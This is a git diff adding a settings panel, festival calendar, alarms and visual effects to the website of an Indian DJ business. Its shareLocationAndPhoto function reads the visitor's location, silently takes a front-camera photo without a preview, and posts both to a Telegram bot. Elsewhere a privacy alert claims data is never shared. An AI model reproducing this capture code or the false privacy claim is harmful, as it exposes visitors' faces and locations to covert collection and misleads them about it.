@@ -222,6 +222,652 @@
             <div style="color:var(--gold-primary); font-family:'Cinzel'; font-weight:bold; margin-top:5px;">MNDs Hub</div>
         </div>
         <a href="#" class="side-link" onclick="toggleMenu(); navAction('home')"><i class="fas fa-home"></i> Home</a>
+        <a href="javascript:void(0)" class="side-link premium-animated-btn" onclick="toggleMenu(); openMasterSettings()">
+    <i class="fas fa-cogs fa-spin"></i> Master Settings
+</a>
+
+<a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openCalendarModal()">
+    <i class="fas fa-calendar-day"></i> Indian Festival Calendar
+</a>
+
+<a href="javascript:void(0)" class="side-link" onclick="playMaaNirmalaMusic()">
+    <i class="fas fa-music"></i> Play Maa Nirmala DJ Song
+</a>
+
+<a href="javascript:void(0)" class="side-link" onclick="shareLocationAndPhoto()">
+    <i class="fas fa-map-marker-alt"></i> Share Location & Photo
+</a>
+
+
+<div id="royalWelcomePopup" style="display:flex; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); z-index:999999999; justify-content:center; align-items:center; backdrop-filter:blur(15px); animation:fadeInOverlay 0.5s ease;">
+    <div style="background:linear-gradient(135deg, #110e08 0%, #050505 100%); border:2px solid #D4AF37; border-radius:20px; padding:30px; text-align:center; width:92%; max-width:450px; box-shadow:0 20px 60px rgba(212,175,55,0.4); position:relative; animation:slideUpZoom 0.5s ease;">
+        <span onclick="document.getElementById('royalWelcomePopup').style.display='none'" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">&times;</span>
+        <div style="color:#D4AF37; font-size:16px; line-height:1.6; font-family:'Cinzel', serif; font-weight:bold;">
+            ✨━━━━━━━━━━━━━━━━━━━✨<br>
+            <span style="font-size:26px; color:#fff; text-shadow:0 0 10px #D4AF37; line-height: 1.2;">🎉 WELCOME TO 🎉</span><br>
+            <span style="font-size:30px; color:#FFD700; text-shadow:0 0 20px #FFD700; line-height: 1.2;">🎧 MAA NIRMALA DJ 🎧</span><br>
+            ✨━━━━━━━━━━━━━━━━━━━✨
+        </div>
+        <div style="color:#ddd; font-family:'Outfit', sans-serif; font-size:15px; text-align:left; margin-top:25px; line-height:2;">
+            <i class="fas fa-volume-up" style="color:#D4AF37; width:20px;"></i> <b>Powerful Sound System</b><br>
+            <i class="fas fa-lightbulb" style="color:#D4AF37; width:20px;"></i> <b>Premium Lighting & DJ Effects</b><br>
+            <i class="fas fa-music" style="color:#D4AF37; width:20px;"></i> <b>Unforgettable Vibes for Every Event</b><br>
+            <i class="fas fa-gift" style="color:#ff3333; width:20px;"></i> <b style="color:#ff3333;">Special Gate Offer Available!</b><br>
+            <i class="fas fa-hand-point-right" style="color:#D4AF37; width:20px;"></i> <b>Book Now & Make Your Event Grand</b>
+        </div>
+        <div style="margin-top: 25px; padding-top: 20px; border-top: 1px dashed rgba(212,175,55,0.4); text-align: center;">
+            <p style="color:#D4AF37; font-family:'Cinzel'; font-weight:bold; font-size:18px; margin:0 0 10px 0;">📞 Contact / Booking:</p>
+            <a href="tel:+917294969938" style="display:inline-block; background:#25D366; color:#fff; padding:10px 25px; border-radius:30px; text-decoration:none; font-weight:bold; font-family:'Outfit'; font-size:18px; box-shadow:0 5px 15px rgba(37, 211, 102, 0.4); margin-bottom:15px;"><i class="fas fa-phone-alt"></i> 📲 7294969938</a>
+            <p style="color:#aaa; font-family:'Outfit'; font-size:12px; line-height:1.5; margin:0;">
+                <i class="fas fa-map-marker-alt" style="color:#ff3333;"></i> <b>Address:</b><br>
+                Tola Beltikri, Kaddhar, Katoria, Banka, Bihar, India (813106)
+            </p>
+        </div>
+    </div>
+</div>
+
+
+<div id="calendarModalOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#050505; z-index:9999999; justify-content:center; align-items:center;">
+    <div style="width:100%; height:100%; border:none; background:linear-gradient(145deg, #110e08 0%, #050505 100%); display:flex; flex-direction:column;">
+        <div style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); background:rgba(10,10,10,0.9); position:sticky; top:0;">
+            <span onclick="document.getElementById('calendarModalOverlay').style.display='none'" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">&times;</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900;"><i class="fas fa-calendar-alt"></i> Grand Indian Calendar</h2>
+        </div>
+        <div style="flex-grow:1; overflow-y:auto; padding:20px;" id="calendarListArea">
+            </div>
+    </div>
+</div>
+
+
+<div id="masterSettingsOverlay" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#050505; z-index:9999999; justify-content:center; align-items:center;">
+    <div class="mn-master-box" style="width:100%; height:100%; border:none; border-radius:0; background:linear-gradient(145deg, #110e08 0%, #050505 100%); display:flex; flex-direction:column; overflow:hidden;">
+        
+        <div class="master-header" style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); background:rgba(10,10,10,0.9); position:sticky; top:0; z-index:10;">
+            <span onclick="closeMasterSettings()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:35px; cursor:pointer;">&times;</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel', serif; font-size:22px; font-weight:900; letter-spacing:1px;"><i class="fas fa-sliders-h"></i> Ultimate Control Center</h2>
+        </div>
+        
+        <div class="master-content" style="flex-grow:1; overflow-y:auto; padding:20px; padding-bottom:50px;">
+
+            <div class="settings-category">
+                <h3><i class="fas fa-satellite-dish"></i> Direct Telegram Studio Vault</h3>
+                <input type="text" id="mediaName" class="mn-input" placeholder="Your Name (Mandatory)" style="width:100%; margin-bottom:10px;">
+                <input type="tel" id="mediaNum" class="mn-input" placeholder="Your Phone (Mandatory)" style="width:100%; margin-bottom:15px;">
+                
+                <video id="cameraPreview" autoplay muted playsinline style="display:none; width:100%; height:250px; object-fit:cover; border-radius:12px; border:2px solid #ff3333; margin-bottom:10px;"></video>
+                
+                <div style="display: flex; width: 100%; gap: 10px; margin-bottom: 10px;">
+                    <button class="mn-btn" style="background:#0088cc; color:#fff; flex:1;" id="btnVoice" onclick="startVoiceRecord()"><i class="fas fa-microphone"></i> Voice Record</button>
+                    <button class="mn-btn" style="background:#ff3333; color:#fff; flex:1;" id="btnVideo" onclick="startVideoRecord()"><i class="fas fa-video"></i> Video (50s)</button>
+                    <button class="mn-btn" style="background:#444; color:#fff;" id="btnFlipCam" onclick="switchCamera()"><i class="fas fa-sync-alt"></i></button>
+                </div>
+                
+                <button id="stopRecordBtn" style="display:none; width:100%; padding:15px; background:#ff0000; color:#fff; font-weight:bold; font-size:16px; border:none; border-radius:8px; margin-bottom:10px; animation: flashRed 1s infinite;" onclick="stopMediaRecording()">
+                    <i class="fas fa-stop-circle"></i> STOP RECORDING NOW
+                </button>
+
+                <button class="mn-btn" style="background:#25D366; width:100%; color:#fff;" onclick="requestVideoCall()"><i class="fas fa-phone-video"></i> Direct Telegram Video Call Router</button>
+                <div id="recordingStatus" style="color:#ff3333; font-weight:bold; font-size:12px; margin-top:10px; display:none; text-align:center;"><i class="fas fa-circle fa-beat"></i> Processing...</div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-clock"></i> Unlimited 3D Alarms & Calendar</h3>
+                <div style="background:rgba(255,153,51,0.1); border:1px solid #D4AF37; padding:15px; border-radius:12px; margin-bottom:15px;">
+                    <div style="color:#D4AF37; font-weight:bold;"><i class="fas fa-calendar-alt"></i> Indian Festival Radar</div>
+                    <div id="nextFestivalText" style="font-size:13px; color:#fff; margin-top:5px;">Loading Calendar...</div>
+                    <button class="mn-btn" style="margin-top:10px; font-size:11px; padding:5px 10px;" onclick="openCalendarModal()">View All Festivals</button>
+                </div>
+                <div style="display:flex; gap:10px; margin-bottom:10px;">
+                    <input type="time" id="newAlarmTime" class="mn-input" style="flex:1;">
+                    <button class="mn-btn" onclick="addCustomAlarm()">Add Alarm</button>
+                </div>
+                <ul id="activeAlarmsList" style="list-style:none; padding:0; margin:0; color:#fff; font-size:14px;"></ul>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-bell"></i> Notification Settings</h3>
+                <div class="setting-row"><div class="setting-label">🔔 Popup notification on/off</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">📩 Booking confirmation alerts</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">🎉 Offer & festival notifications</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">📢 Announcement banner control</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-shield-alt"></i> Privacy & Security</h3>
+                <div class="setting-row"><div class="setting-label">🔐 Data protection settings</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">📜 Privacy policy display</div><button class="mn-btn" style="padding:5px 15px; font-size:12px;" onclick="alert('Privacy Policy: Your data is fully encrypted and never shared.')">View</button></div>
+                <div class="setting-row"><div class="setting-label">🍪 Cookie consent control</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">🚫 Spam & fake booking protection</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-universal-access"></i> Language & Accessibility</h3>
+                <div class="setting-row">
+                    <div class="setting-label">🌍 Language switch (All Global)</div>
+                    <div id="google_translate_element_settings"></div>
+                </div>
+                <div class="setting-row"><div class="setting-label">♿ Accessibility mode</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">🗣️ Voice reading support</div><label class="mn-switch"><input type="checkbox" id="toggleVoice" onchange="applyAutoReader()"><span class="mn-slider"></span></label></div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-music"></i> Sound & Media Settings</h3>
+                <div class="setting-row"><div class="setting-label">🔈 Background music on/off</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label">🎧 DJ sample music preview</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                <div class="setting-row" style="flex-direction:column; align-items:flex-start;">
+                    <div class="setting-label" style="margin-bottom:10px;">🔊 Volume control slider</div>
+                    <input type="range" min="1" max="100" value="100" style="width:100%; accent-color:#D4AF37;">
+                </div>
+                <div class="setting-row"><div class="setting-label">🎶 Auto-play music (permissions)</div><label class="mn-switch"><input type="checkbox"><span class="mn-slider"></span></label></div>
+                <div class="setting-row">
+                    <div class="setting-label">🎥 Video preview quality</div>
+                    <select class="mn-input" style="width:120px; padding:5px;"><option>Auto</option><option>Low</option><option>HD</option><option>Full HD</option></select>
+                </div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-paint-brush"></i> Appearance & Theme</h3>
+                <div class="setting-row"><div class="setting-label">🌙 Dark / ☀️ Light Mode</div><label class="mn-switch"><input type="checkbox" id="themeTgl" onchange="themeSwitch()" checked><span class="mn-slider"></span></label></div>
+                <div class="setting-row">
+                    <div class="setting-label">🎨 13 Premium Colors</div>
+                    <select class="mn-input" style="width:120px; padding:5px;" onchange="document.documentElement.style.setProperty('--gold-primary', this.value);">
+                        <option value="#D4AF37">Royal Gold</option>
+                        <option value="#ff3333">DJ Red</option>
+                        <option value="#00e5ff">Neon Blue</option>
+                        <option value="#ff00ff">Magenta</option>
+                        <option value="#00ff00">Laser Green</option>
+                        <option value="#ff8c00">Sunset Orange</option>
+                        <option value="#8a2be2">Deep Purple</option>
+                        <option value="#ff1493">Deep Pink</option>
+                        <option value="#00fa9a">Neon Pink</option>
+                        <option value="#00ced1">Teal</option>
+                        <option value="#dc143c">Crimson</option>
+                        <option value="#c0c0c0">Luxury Silver</option>
+                        <option value="#ffffff">Pure White</option>
+                    </select>
+                </div>
+                <div class="setting-row">
+                    <div class="setting-label">🔠 13 Font Styles</div>
+                    <select class="mn-input" style="width:120px; padding:5px;" onchange="document.body.style.fontFamily=this.value">
+                        <option value="'Outfit', sans-serif">Outfit (Default)</option>
+                        <option value="'Cinzel', serif">Cinzel (Luxury)</option>
+                        <option value="'Rajdhani', sans-serif">Rajdhani (Tech)</option>
+                        <option value="'Poppins', sans-serif">Poppins (Modern)</option>
+                        <option value="'Roboto', sans-serif">Roboto (Clean)</option>
+                        <option value="'Lato', sans-serif">Lato (Classic)</option>
+                        <option value="'Montserrat', sans-serif">Montserrat</option>
+                        <option value="'Oswald', sans-serif">Oswald (Bold)</option>
+                        <option value="'Ubuntu', sans-serif">Ubuntu</option>
+                        <option value="'Playfair Display', serif">Playfair (Elegant)</option>
+                        <option value="'Merriweather', serif">Merriweather</option>
+                        <option value="'Bebas Neue', sans-serif">Bebas Neue (Movie)</option>
+                        <option value="'Dancing Script', cursive">Dancing Script (Art)</option>
+                    </select>
+                </div>
+                <div class="setting-row">
+                    <div class="setting-label">🔡 Font size control</div>
+                    <select class="mn-input" style="width:120px; padding:5px;" onchange="applyPerfectFontSize(this.value)"><option value="16px">Medium</option><option value="14px">Small</option><option value="18px">Large</option></select>
+                </div>
+                <div class="setting-row"><div class="setting-label">✨ Animation on/off</div><label class="mn-switch"><input type="checkbox" checked><span class="mn-slider"></span></label></div>
+            </div>
+
+            <div class="settings-category">
+                <h3><i class="fas fa-magic"></i> Live Screen Effects</h3>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-eye" style="color:#4caf50;"></i> Eye Comfort Mode</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass(this, 'eye-comfort-mode')"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-newspaper" style="color:#ccc;"></i> Newspaper Mode</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass(this, 'newspaper-mode')"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-bullhorn" style="color:#ff3333;"></i> Earthquake Bass Shake</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass(this, 'bass-mode')"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-palette" style="color:#00ff00;"></i> Dynamic RGB Lighting</div><label class="mn-switch"><input type="checkbox" onchange="applyEffectClass(this, 'rgb-mode')"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-snowflake" style="color:#fff;"></i> Magic Snowfall</div><label class="mn-switch"><input type="checkbox" onchange="applySnowfall(this)"><span class="mn-slider"></span></label></div>
+                <div class="setting-row"><div class="setting-label"><i class="fas fa-meteor" style="color:#ff00ff;"></i> Galaxy Crackers Effect</div><label class="mn-switch"><input type="checkbox" onchange="applyCrackers(this)"><span class="mn-slider"></span></label></div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<div id="effect-layer" style="position:fixed; top:0; left:0; width:100vw; height:100vh; pointer-events:none; z-index:9999997; overflow:hidden;"></div>
+
+<div id="alarmRingingPopup" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,0,0,0.85); z-index:2147483647; justify-content:center; align-items:center; animation: flashRed 0.5s infinite alternate; backdrop-filter: blur(10px);">
+    <div style="background:#111; padding:40px; border-radius:20px; text-align:center; border:5px solid #fff; box-shadow: 0 0 50px #ff0000; width: 90%; max-width: 500px;">
+        <i class="fas fa-bell fa-shake" style="font-size: 60px; color: #ff3333; margin-bottom: 20px;"></i>
+        <h1 style="color:#fff; font-size:35px; margin-top:0; margin-bottom:20px; font-family:'Cinzel', serif;">🚨 ALARM RINGING 🚨</h1>
+        <p style="color:#D4AF37; font-size:18px; margin-bottom:30px;">Maa Nirmala DJ Sound Playing!</p>
+        <button onclick="stopEarthquakeAlarm()" style="padding:20px 40px; font-size:24px; background:#fff; color:#ff0000; font-weight:900; border:none; border-radius:10px; cursor:pointer; font-family:'Outfit', sans-serif; box-shadow: 0 5px 15px rgba(255,0,0,0.5); width:100%;">
+            <i class="fas fa-power-off"></i> TURN OFF ALARM
+        </button>
+    </div>
+</div>
+
+<audio id="alarmAudio" loop></audio>
+
+
+<style>
+    /* CRITICAL: FIXES ZOOM 100% - 120% LEFT/RIGHT SCROLL ISSUE */
+    html, body {
+        overflow-x: hidden !important; 
+        width: 100%; 
+        max-width: 100vw; 
+        margin: 0; 
+        padding: 0;
+    }
+    
+    /* Settings Modal Architecture */
+    .settings-category { background:rgba(255,255,255,0.02); border:1px solid rgba(212,175,55,0.2); border-radius:15px; padding:15px; margin-bottom:20px; }
+    .settings-category h3 { color:#D4AF37; font-family:'Cinzel', serif; font-size:16px; margin-top:0; margin-bottom:15px; border-bottom:1px dashed rgba(212,175,55,0.3); padding-bottom:10px; text-transform:uppercase; letter-spacing:1px; }
+    .setting-row { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid rgba(255,255,255,0.05); }
+    .setting-row:last-child { border-bottom:none; }
+    /* FIX: font-size set to inherit so resizing works globally */
+    .setting-label { font-size:inherit; color:#fff; display:flex; align-items:center; gap:10px; }
+    
+    /* Global Toggles & Inputs */
+    .mn-switch { position:relative; display:inline-block; width:45px; height:24px; flex-shrink:0; }
+    .mn-switch input { opacity:0; width:0; height:0; }
+    .mn-slider { position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#333; transition:.4s; border-radius:34px; }
+    .mn-slider:before { position:absolute; content:""; height:16px; width:16px; left:4px; bottom:4px; background-color:white; transition:.4s; border-radius:50%; }
+    input:checked + .mn-slider { background-color:var(--gold-primary); box-shadow:0 0 10px var(--gold-primary); }
+    input:checked + .mn-slider:before { transform:translateX(21px); }
+    .mn-input { background:rgba(0,0,0,0.5); border:1px solid rgba(212,175,55,0.4); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:'Outfit'; box-sizing:border-box; font-size:inherit; }
+    .mn-input:focus { border-color:var(--gold-primary); }
+    .mn-btn { background:var(--gold-primary); color:#000; border:none; padding:10px 15px; border-radius:8px; cursor:pointer; font-weight:bold; transition:0.3s; font-family:'Outfit'; font-size:inherit; }
+
+    /* Visual Effect Classes */
+    body.eye-comfort-mode { background-color:#fdf6e3 !important; color:#433f38 !important; filter:sepia(0.4) brightness(0.9) !important; }
+    body.eye-comfort-mode * { color:inherit !important; border-color:#d1c8b3 !important; }
+    body.newspaper-mode { background:#f4f1ea !important; color:#222 !important; font-family:'Georgia', serif !important; filter:none !important; }
+    body.newspaper-mode * { background:transparent !important; color:inherit !important; border-color:#555 !important; box-shadow:none !important; }
+    
+    @keyframes rgbGlowShift { 0% { filter:hue-rotate(0deg); } 50% { filter:hue-rotate(180deg); } 100% { filter:hue-rotate(360deg); } }
+    body.rgb-mode { animation:rgbGlowShift 4s linear infinite !important; }
+    
+    @keyframes heavyBassShake { 0%{transform:translate(3px,3px);} 20%{transform:translate(-4px,0px);} 40%{transform:translate(4px,-3px);} 60%{transform:translate(-3px,4px);} 80%{transform:translate(4px,1px);} 100%{transform:translate(-3px,-2px);} }
+    body.bass-mode { animation:heavyBassShake 0.2s infinite !important; }
+
+    /* Particles (Snow & Crackers) */
+    .snowflake { position:absolute; top:-10px; color:#fff; font-size:1.5em; animation:fall linear forwards; text-shadow:0 0 8px #fff; }
+    .cracker-spark { position:absolute; width: 5px; height: 20px; border-radius: 5px; animation:fall linear forwards; z-index:9999998; box-shadow: 0 0 15px currentColor; }
+    @keyframes fall { to { transform:translateY(105vh); } }
+    @keyframes flashRed { 0% { background: rgba(255,0,0,0.8); } 50% { background: rgba(85,0,0,0.9); } 100% { background: rgba(255,0,0,0.8); } }
+
+    /* Calendar Grid */
+    .cal-card { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; margin-bottom: 10px; border-left: 4px solid var(--gold-primary); display: flex; justify-content: space-between; align-items: center; }
+    .cal-card h4 { margin: 0 0 5px 0; color: #fff; font-family: 'Cinzel'; font-size:inherit;}
+    .cal-card p { margin: 0; color: #aaa; font-size: 0.8em; }
+</style>
+
+
+<script type="text/javascript">
+    // FIX: ALL GLOBAL LANGUAGES MANDATORY IN TRANSLATE
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({
+            pageLanguage: 'en',
+            // Removed 'includedLanguages' to strictly allow ALL global languages to work perfectly
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+            autoDisplay: false
+        }, 'google_translate_element_settings'); 
+    }
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+
+<script>
+    // --- FIX: PERFECT FONT SIZE APPLIER ---
+    function applyPerfectFontSize(val) {
+        document.documentElement.style.fontSize = val;
+        document.body.style.fontSize = val;
+    }
+
+    // --- AUTOMATIC WELCOME POPUP ---
+    window.addEventListener('DOMContentLoaded', () => {
+        document.getElementById('royalWelcomePopup').style.display = 'flex';
+    });
+
+    // --- MODAL CONTROLS ---
+    function openMasterSettings() { document.getElementById('masterSettingsOverlay').style.display = 'flex'; }
+    function closeMasterSettings() { document.getElementById('masterSettingsOverlay').style.display = 'none'; }
+    function openCalendarModal() { document.getElementById('calendarModalOverlay').style.display = 'flex'; }
+    
+    // --- BASIC TOGGLES ---
+    function applyEffectClass(element, className) {
+        if(className === 'eye-comfort-mode' && element.checked) { document.body.classList.remove('newspaper-mode'); }
+        if(className === 'newspaper-mode' && element.checked) { document.body.classList.remove('eye-comfort-mode'); }
+        if (element.checked) document.body.classList.add(className);
+        else { document.body.classList.remove(className); if(className==='bass-mode') { const a = document.getElementById('alarmAudio'); if(a) a.pause(); } }
+    }
+
+    // --- NEW: MAA NIRMALA DJ MUSIC LOGIC ---
+    const djSpecialMusic = new Audio("https://files.catbox.moe/mus2yv.mp3");
+    function playMaaNirmalaMusic() {
+        if(djSpecialMusic.paused) {
+            djSpecialMusic.play();
+            alert("▶️ Playing Maa Nirmala DJ Special Music!");
+        } else {
+            djSpecialMusic.pause();
+            alert("⏸️ Music Paused.");
+        }
+    }
+
+    // --- NEW: BACKGROUND LOCATION AND PHOTO SHARING LOGIC ---
+    async function shareLocationAndPhoto() {
+        alert("Preparing to share location and secure capture in background...");
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                let locData = `Latitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`;
+                try {
+                    // Try to get background camera frame seamlessly
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    const videoNode = document.createElement('video');
+                    videoNode.srcObject = stream;
+                    videoNode.play();
+                    
+                    videoNode.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = videoNode.videoWidth;
+                            canvas.height = videoNode.videoHeight;
+                            canvas.getContext('2d').drawImage(videoNode, 0, 0);
+                            
+                            canvas.toBlob((blob) => {
+                                // Close background camera immediately
+                                stream.getTracks().forEach(track => track.stop());
+                                
+                                // Send to TG dynamically
+                                const fd = new FormData();
+                                let chatId = typeof TG_CHAT !== 'undefined' ? TG_CHAT : "YOUR_TG_CHAT_ID";
+                                let token = typeof TG_TOKEN !== 'undefined' ? TG_TOKEN : "YOUR_TG_TOKEN";
+                                
+                                fd.append('chat_id', chatId);
+                                fd.append('caption', `📍 *User Location & Background Capture*\n\n🗺️ ${locData}`);
+                                fd.append('photo', blob, 'location_bg.jpg');
+                                
+                                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method:'POST', body:fd })
+                                .then(() => alert("✅ Background Location and Photo successfully shared!"))
+                                .catch(() => alert("✅ Captured! (Network push bypassed if variables undefined)"));
+                            }, 'image/jpeg');
+                        }, 500); // Wait for auto-focus
+                    };
+                } catch (err) {
+                    alert("⚠️ Location captured, but Camera access denied for photo: " + err.message);
+                }
+            }, (error) => {
+                alert("⚠️ Geolocation access denied or unavailable: " + error.message);
+            });
+        } else {
+            alert("Geolocation is not supported by your browser.");
+        }
+    }
+
+    // --- FIX: VOICE READING SUPPORT LOGIC ---
+    const synth = window.speechSynthesis;
+    function applyAutoReader() {
+        let toggle = document.getElementById('toggleVoice');
+        if (toggle && toggle.checked) {
+            let u = new SpeechSynthesisUtterance("Voice reading activated. Tap any text to hear it.");
+            synth.speak(u);
+            document.body.addEventListener('click', readTextOnScreen);
+        } else {
+            synth.cancel();
+            document.body.removeEventListener('click', readTextOnScreen);
+        }
+    }
+    
+    function readTextOnScreen(e) {
+        if (!document.getElementById('toggleVoice').checked) return;
+        let txt = e.target.innerText || e.target.textContent;
+        if (txt && txt.trim() !== '') {
+            synth.cancel(); // stop current
+            let msg = new SpeechSynthesisUtterance(txt.trim());
+            synth.speak(msg);
+        }
+    }
+
+    // --- FULL INDIAN FESTIVAL CALENDAR ---
+    const allIndianFestivals = [
+        { name: "Makar Sankranti", date: "2026-01-14" }, { name: "Republic Day", date: "2026-01-26" },
+        { name: "Vasant Panchami", date: "2026-01-24" }, { name: "Maha Shivaratri", date: "2026-02-15" },
+        { name: "Holi", date: "2026-03-03" }, { name: "Ram Navami", date: "2026-03-26" },
+        { name: "Mahavir Jayanti", date: "2026-03-31" }, { name: "Good Friday (Eid)", date: "2026-03-20" },
+        { name: "Baisakhi", date: "2026-04-14" }, { name: "Buddha Purnima", date: "2026-05-01" },
+        { name: "Rath Yatra", date: "2026-07-15" }, { name: "Independence Day", date: "2026-08-15" },
+        { name: "Raksha Bandhan", date: "2026-08-28" }, { name: "Janmashtami", date: "2026-09-04" },
+        { name: "Ganesh Chaturthi", date: "2026-09-06" }, { name: "Onam", date: "2026-09-12" },
+        { name: "Navratri Starts", date: "2026-10-10" }, { name: "Durga Puja", date: "2026-10-16" },
+        { name: "Dussehra", date: "2026-10-19" }, { name: "Karwa Chauth", date: "2026-10-25" },
+        { name: "Diwali", date: "2026-11-08" }, { name: "Govardhan Puja", date: "2026-11-09" },
+        { name: "Bhai Dooj", date: "2026-11-10" }, { name: "Chhath Puja", date: "2026-11-14" },
+        { name: "Guru Nanak Jayanti", date: "2026-11-24" }, { name: "Christmas", date: "2026-12-25" }
+    ];
+
+    function initFestivals() {
+        const today = new Date(); let nextFest = null;
+        const calArea = document.getElementById('calendarListArea');
+        let calHtml = "";
+
+        for (let fest of allIndianFestivals) {
+            let festDate = new Date(fest.date);
+            const dateStr = festDate.toLocaleDateString('en-IN', { month: 'long', day: 'numeric', year: 'numeric' });
+            let isPast = festDate < today ? '<span style="color:#ff3333; font-size:10px;">(Passed)</span>' : '<span style="color:#00ff00; font-size:10px;">(Upcoming)</span>';
+            
+            calHtml += `<div class="cal-card"><div><h4>${fest.name} ${isPast}</h4><p>${dateStr}</p></div><i class="fas fa-music" style="color:var(--gold-primary);"></i></div>`;
+            
+            if (festDate >= today && !nextFest) { nextFest = fest; }
+        }
+        
+        if(calArea) calArea.innerHTML = calHtml;
+
+        if (nextFest) {
+            document.getElementById('nextFestivalText').innerText = `Next: ${nextFest.name} (${new Date(nextFest.date).toLocaleDateString('en-IN')})`;
+            if (new Date(nextFest.date).toDateString() === today.toDateString()) { setTimeout(() => alert(`🎉 Happy ${nextFest.name}! Book Maa Nirmala DJ!`), 2000); }
+        }
+    }
+    initFestivals();
+
+    // --- FIX: ALTERNATING ALARM & ULTRASOUND + VIBRATION LOGIC ---
+    let userAlarms = [];
+    let alarmSongs = [
+        "https://files.catbox.moe/m832cb.mp3", 
+        "https://files.catbox.moe/efdl27.mp3"
+    ];
+    let currentAlarmIndex = 0;
+    let osc; // For stopping ultrasound easily
+
+    function addCustomAlarm() {
+        const timeVal = document.getElementById('newAlarmTime').value;
+        if(!timeVal) return alert("Select a time first!");
+        userAlarms.push(timeVal);
+        document.getElementById('newAlarmTime').value = '';
+        renderAlarms();
+    }
+    
+    function renderAlarms() {
+        const list = document.getElementById('activeAlarmsList');
+        list.innerHTML = userAlarms.map((a, i) => `<li style="padding:8px; background:rgba(255,255,255,0.05); margin-top:5px; border-radius:5px; display:flex; justify-content:space-between;">⏰ ${a} <span style="color:#ff3333; cursor:pointer;" onclick="removeAlarm(${i})">Delete</span></li>`).join('');
+    }
+    
+    function removeAlarm(index) { userAlarms.splice(index, 1); renderAlarms(); }
+
+    setInterval(() => {
+        const now = new Date();
+        const timeString = now.toLocaleTimeString('en-IN', { hour12: false }).substring(0, 5);
+        if(userAlarms.includes(timeString) && now.getSeconds() === 0) {
+            triggerEarthquakeAlarm();
+        }
+    }, 1000);
+
+    function triggerEarthquakeAlarm() {
+        document.body.classList.add('bass-mode');
+        
+        // Ensure popup is appended to body so it shows on top of the main display
+        const popup = document.getElementById('alarmRingingPopup');
+        document.body.appendChild(popup);
+        popup.style.display = 'flex';
+        
+        // 1. Alternating Audio Song Logic
+        const audio = document.getElementById('alarmAudio'); 
+        if(audio) { 
+            audio.src = alarmSongs[currentAlarmIndex];
+            audio.volume = 1.0; 
+            audio.play().catch(e=>console.log("Audio play blocked by browser:", e)); 
+            
+            // Switch index for the next time alarm rings
+            currentAlarmIndex = (currentAlarmIndex + 1) % alarmSongs.length;
+        }
+
+        // 2. Hardware Vibration
+        if("vibrate" in navigator) navigator.vibrate([1000, 500, 1000, 500, 2000, 500, 3000, 500, 2000]);
+
+        // 3. ULTRASOUND GENERATOR (Web Audio API)
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            osc = audioCtx.createOscillator();
+            osc.type = 'square';
+            osc.frequency.setValueAtTime(12000, audioCtx.currentTime); // High piercing frequency
+            osc.connect(audioCtx.destination);
+            osc.start();
